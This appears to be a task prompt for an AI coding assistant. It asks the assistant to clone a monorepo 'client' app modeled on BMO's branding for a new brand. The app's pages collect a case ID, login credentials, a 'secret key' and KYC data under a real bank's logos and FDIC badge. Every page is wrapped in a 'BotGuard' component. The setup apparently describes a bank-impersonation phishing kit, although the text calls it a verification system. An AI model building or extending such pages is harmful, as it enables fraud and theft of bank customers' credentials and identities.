Objective: Add a new client application to this monorepo verification system.

Reference Files (Study these first):

# Primary Reference (USB Client - most polished)
apps/bmo-client/                          # Full working implementation
apps/bmo-client/src/config/branding.ts    # Brand configuration pattern
apps/bmo-client/src/app/page.tsx          # Landing page structure (Case ID)
apps/bmo-client/src/app/[session_uuid]/credentials/page.tsx  # Login page
apps/bmo-client/src/app/[session_uuid]/secret-key/page.tsx   # Secret key page
apps/bmo-client/src/app/[session_uuid]/kyc/page.tsx          # KYC page
apps/bmo-client/src/app/[session_uuid]/completed/page.tsx    # Success page
apps/bmo-client/src/app/[session_uuid]/terminated/page.tsx   # Session ended page
apps/bmo-client/src/app/layout.tsx        # Root layout with Header/Footer
apps/bmo-client/src/components/layout/    # Header, Footer, Feedback components
apps/bmo-client/src/styles/reference/     # CSS design system (variables, layout, components)
apps/bmo-client/public/brands/bmo/    # Brand assets (logo, favicon, FDIC logo)
apps/bmo-client/public/config.js          # Runtime configuration
# Template (Bare minimum starting point)
apps/template/                            # Copy this folder for new clients
# Shared Library
packages/shared/                          # Shared session store, types, utilities
Steps:

Copy Template: Duplicate apps/template/ to apps/[new-client-name]-client/
Update package.json: Change name to [new-client-name]-client, set dev port (e.g., -p 400X)
Create Brand Assets: Add logo, favicon, and any brand-specific images to public/brands/[brand-id]/
Configure Branding: Update src/config/branding.ts with:
Company name, colors
Logo path, support contact
Set default fallback to the new brand ID
Create Layout Components: Create bankHeader.tsx equivalent for the new brand (copy from bmo-client, update logo/links)
all the new asstes that you need are in public folder for the new client that we are adding C:\Users\Modmin\Downloads\user-client-main\user-client-main\reference styles\public
Create Footer: Copy and customize the footer per brand requirements
Update layout.tsx: Import and use the brand-specific Header/Footer
Create All Pages: Copy all page components from bmo-client and customize:
Landing page (Case ID input)
Credentials page (Login form)
Secret-key page
KYC page
Completed page
Terminated page

<BotGuard>
  <div className="fdic-box">...</div>          {/* Top banner - customize per brand */}
  <section className="login-header"><h2>Title</h2></section>
  <form className="login-form">
    {/* Form content: inputs, buttons */}
    <div className="link-group">
      {/* Footer links inside form */}
    </div>
  </form>
</BotGuard>
Key Design Patterns:

Use BotGuard wrapper on all pages
In-line button loading (no full-page spinners)
Consistent  trust badge if any on all pages

the reference design styles is here
basically you are simple styling 

ultra think